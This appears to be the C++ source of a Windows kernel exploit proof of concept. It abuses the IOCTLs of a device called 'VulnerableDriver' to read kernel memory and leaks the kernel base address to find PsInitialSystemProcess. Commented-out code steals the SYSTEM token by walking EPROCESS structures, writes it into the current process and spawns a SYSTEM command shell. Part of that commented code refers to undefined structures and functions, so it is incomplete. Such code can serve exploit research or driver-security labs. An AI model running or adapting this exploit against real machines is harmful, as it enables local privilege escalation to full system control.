#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <iostream>
#include <sstream>

#define IOCTL_READ_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define EPROCESS structure offsets
#define EPROCESS_TOKEN_OFFSET 0x4b8     // Token offset in EPROCESS
#define EPROCESS_PID_OFFSET   0x440     // PID offset in EPROCESS
#define SYSTEM_PID 4                    // SYSTEM process has PID 4

/*
ULONG_PTR GetKernelBaseAddress() {
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    // first call calculates the exact size needed to read all the data
    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        return pKernelBaseAddress;
    }

    // allocate enough memory to read all data from EnumDeviceDrivers
    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Couldn't allocate heap for lpImageBase.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    // the first entry in the list is the kernel
    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
    printf("[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

DWORD GetPsInitialSystemProcessOffset() {
    HMODULE ntoskrnl = NULL;
    DWORD dwPsInitialSystemProcessOffset = 0;
    ULONG_PTR pPsInitialSystemProcess = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (ntoskrnl == NULL) {
        printf("[-] Couldn't load ntoskrnl.exe\n");
        return 0;
    }

    pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(ntoskrnl, "PsInitialSystemProcess");
    if (pPsInitialSystemProcess) {
        // substracting from the address of the symbol the base address gives us the offset
        dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)(ntoskrnl));
        FreeLibrary(ntoskrnl);
        return dwPsInitialSystemProcessOffset;
    }

    printf("[-] Couldn't GetProcAddress of PsInitialSystemProcess\n");
    return 0;
}

ULONG_PTR GetKernelAddress(ULONG_PTR KernelBase, DWORD Offset) {
    return KernelBase + Offset;
}

HANDLE open_driver_handle()
{
    HANDLE hDevice = CreateFile(L"\\\\.\\VulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open handle to the driver. Error code: %lu\n", GetLastError());
        return NULL;
    }
    printf("[+] Successfully opened handle to the driver\n");
    return hDevice;
}

BOOL read_kernel_memory(HANDLE hDevice, PVOID address, PVOID buffer, SIZE_T size)
{
    RW_OPERATION rwOp = { address, buffer, size };
    DWORD bytesReturned;
    return DeviceIoControl(hDevice, IOCTL_VULN_CODE_READ, &rwOp, sizeof(rwOp), NULL, 0, &bytesReturned, NULL);
}

BOOL write_kernel_memory(HANDLE hDevice, PVOID address, PVOID buffer, SIZE_T size)
{
    RW_OPERATION rwOp = { address, buffer, size };
    DWORD bytesReturned;
    return DeviceIoControl(hDevice, IOCTL_VULN_CODE_WRITE, &rwOp, sizeof(rwOp), NULL, 0, &bytesReturned, NULL);
}



PVOID get_system_token(HANDLE hDevice)
{
    scanf_s("%*c");
    PVOID currentEPROCESS = get_current_process_eprocess();
    PVOID systemEPROCESS = NULL;
    ULONG_PTR systemToken = 0;

    ULONG_PTR currentPID = 0;
    read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)currentEPROCESS + EPROCESS_PID_OFFSET), &currentPID, sizeof(ULONG_PTR));

    PVOID processListEntry = (PVOID)((ULONG_PTR)currentEPROCESS + 0x2f0); 
    PVOID nextProcess = processListEntry;

    do {
        ULONG_PTR pid = 0;
        PVOID nextEPROCESS = (PVOID)((ULONG_PTR)nextProcess - 0x2f0);

        read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)nextEPROCESS + EPROCESS_PID_OFFSET), &pid, sizeof(ULONG_PTR));

        if (pid == SYSTEM_PID) {
            systemEPROCESS = nextEPROCESS;
            break;
        }

        // Move to the next process in the active process list
        read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)nextProcess), &nextProcess, sizeof(PVOID));

    } while (nextProcess != processListEntry);

    if (systemEPROCESS) {
        read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)systemEPROCESS + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(ULONG_PTR));
        systemToken &= ~0xF;  // Clear the lower 4 bits (TOKEN value has some flags)
        return (PVOID)systemToken;
    }
    else {
        printf("[-] Failed to locate SYSTEM EPROCESS\n");
        return NULL;
    }
}

BOOL set_system_token(HANDLE hDevice, PVOID systemToken)
{
    PVOID currentEPROCESS = get_current_process_eprocess();
    return write_kernel_memory(hDevice, (PVOID)((ULONG_PTR)currentEPROCESS + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(ULONG_PTR));
}
*/

HANDLE openDevice(PCWSTR symLink) {
    return CreateFile(
        symLink,   // The symbolic link to the device
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
}

UCHAR readBYTE(HANDLE hDevice, PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    uint8_t buffer[9]; // buffer[0-7] = address, buffer[8] = value

    memcpy(buffer, &address, sizeof(PVOID));

    bool success;
    DWORD bytesReturned;
    success = DeviceIoControl(
        hDevice,
        IOCTL_READ_BYTE,
        &buffer,
        sizeof(buffer),
        &buffer,
        sizeof(buffer),
        &bytesReturned,
        NULL);

    if (!success) {
        std::cerr << "Read failed. Error: " << GetLastError() << std::endl;
        return -1;
    }

    return buffer[8];
}

WORD readWORD(HANDLE hDevice, PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    WORD result = 0;

    BYTE* ptr = static_cast<BYTE*>(address);
    result |= readBYTE(hDevice, ptr);
    result |= (readBYTE(hDevice, ptr + 1) << 8);

    return result;
}

DWORD readDWORD(HANDLE hDevice, PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    DWORD result = 0;

    // Cast the base address to BYTE* for proper byte-wise pointer arithmetic
    BYTE* ptr = static_cast<BYTE*>(address);

    // Read each byte and shift them into the DWORD result
    result |= readBYTE(hDevice, ptr);               // Read byte 0
    result |= (readBYTE(hDevice, ptr + 1) << 8);    // Read byte 1
    result |= (readBYTE(hDevice, ptr + 2) << 16);   // Read byte 2
    result |= (readBYTE(hDevice, ptr + 3) << 24);   // Read byte 3

    return result;
}

uint64_t readQWORD(HANDLE hDevice, PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    uint64_t result = 0;

    BYTE* ptr = static_cast<BYTE*>(address);
    DWORD lowPart = readDWORD(hDevice, ptr);
    DWORD highPart = readDWORD(hDevice, ptr + 4);

    result = (static_cast<uint64_t>(highPart) << 32) | static_cast<uint64_t>(lowPart);

    return result;
}

ULONG_PTR GetKernelBaseAddress() {
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    // first call calculates the exact size needed to read all the data
    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        return pKernelBaseAddress;
    }

    // allocate enough memory to read all data from EnumDeviceDrivers
    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Couldn't allocate heap for lpImageBase.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    // the first entry in the list is the kernel
    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
    printf("[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

DWORD GetPsInitialSystemProcessOffset() {
    HMODULE ntoskrnl = NULL;
    DWORD dwPsInitialSystemProcessOffset = 0;
    ULONG_PTR pPsInitialSystemProcess = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (ntoskrnl == NULL) {
        printf("[-] Couldn't load ntoskrnl.exe\n");
        return 0;
    }

    pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(ntoskrnl, "PsInitialSystemProcess");
    if (pPsInitialSystemProcess) {
        // substracting from the address of the symbol the base address gives us the offset
        dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)(ntoskrnl));
        FreeLibrary(ntoskrnl);
        return dwPsInitialSystemProcessOffset;
    }

    printf("[-] Couldn't GetProcAddress of PsInitialSystemProcess\n");
    return 0;
}

ULONG_PTR GetKernelAddress(ULONG_PTR KernelBase, DWORD Offset) {
    return KernelBase + Offset;
}

int main(int argc, char** argv)
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <kernel_address>" << std::endl;
        return 1;
    }

    scanf_s("%*c");

    // Parse the memory address from argv[1]
    std::stringstream ss;
    ss << std::hex << argv[1];
    PVOID address = nullptr;
    ss >> address;

    if (address == nullptr) {
        std::cerr << "Invalid address provided." << std::endl;
        return 1;
    }

    HANDLE hDevice = openDevice(L"\\\\.\\VulnerableDriver");
    std::cout << "Read BYTE successful, value: 0x" << std::hex << static_cast<int>(readBYTE(hDevice, address)) << std::endl;
    std::cout << "Read DWORD successful, value: 0x" << std::hex << static_cast<int>(readDWORD(hDevice, address)) << std::endl;
    std::cout << "Read QWORD successful, value: 0x" << std::hex << static_cast<uint64_t>(readQWORD(hDevice, address)) << std::endl;

    /////////////////////////////////////

    ULONG_PTR lpKernelBase = GetKernelBaseAddress();
    if (!lpKernelBase) {
        return FALSE;
    }

    DWORD dwPsInitialSystemProcessOffset = GetPsInitialSystemProcessOffset();
    if (!dwPsInitialSystemProcessOffset)
        return FALSE;

    ULONG_PTR lpPsInitialSystemProcess = GetKernelAddress(lpKernelBase, dwPsInitialSystemProcessOffset);

    uint64_t lpInitialSystemProcess = readQWORD(hDevice, reinterpret_cast<PVOID>(lpPsInitialSystemProcess));
    std::cout << "Token value: 0x" << std::hex << lpInitialSystemProcess << std::endl;

    /*
    HANDLE hDevice = open_driver_handle();
    if (!hDevice) {
        return -1;
    }

    // Get the SYSTEM token via arbitrary read
    PVOID systemToken = get_system_token(hDevice);
    if (!systemToken) {
        CloseHandle(hDevice);
        return -1;
    }

    // Replace current process token with SYSTEM token via arbitrary write
    if (!set_system_token(hDevice, systemToken)) {
        printf("[-] Failed to set SYSTEM token\n");
        CloseHandle(hDevice);
        return -1;
    }

    printf("[+] Successfully set SYSTEM token for current process\n");

    // Spawn a SYSTEM cmd.exe
    printf("[+] Spawning SYSTEM cmd.exe\n");
    system("cmd.exe");
    */

    CloseHandle(hDevice);
    return 0;
}
